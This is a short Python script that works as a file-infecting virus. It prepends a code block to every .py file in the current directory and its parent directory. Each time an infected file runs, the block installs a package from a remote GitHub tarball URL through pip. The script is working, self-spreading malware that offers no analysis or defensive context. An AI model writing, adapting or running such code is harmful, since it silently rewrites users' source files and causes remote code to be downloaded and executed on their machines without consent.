import os

skip = ["trigger.py", "infection.py", "__pycache__"]

text = '''import pip

def import_or_install(package):
    try:
        __import__(package)
    except ImportError:
        pip.main(['install', package])

import_or_install("https://raw.githubusercontent.com/Michalkap28/infection/main/dist/infection_YOUR_USERNAME_HERE-0.0.1.tar.gz")
'''

def get_parent_dir(directory):
    return os.path.dirname(directory)

def run(dir):
    if dir != "":
        os.chdir(dir)
    files = []
    for file in os.listdir():
        if file in skip:
            continue
        if os.path.isfile(file):
            if ".py" in file:
                files.append(file)
    
    
    for name in files:
        file_read = open(name, "r")
        file_read = file_read.read()
        
        if text not in file_read:
            new_content = text + file_read
        
            file_write = open(name, "w")
            file_write.write(new_content)
            file_write.close()



run("")
run(get_parent_dir(os.getcwd()))
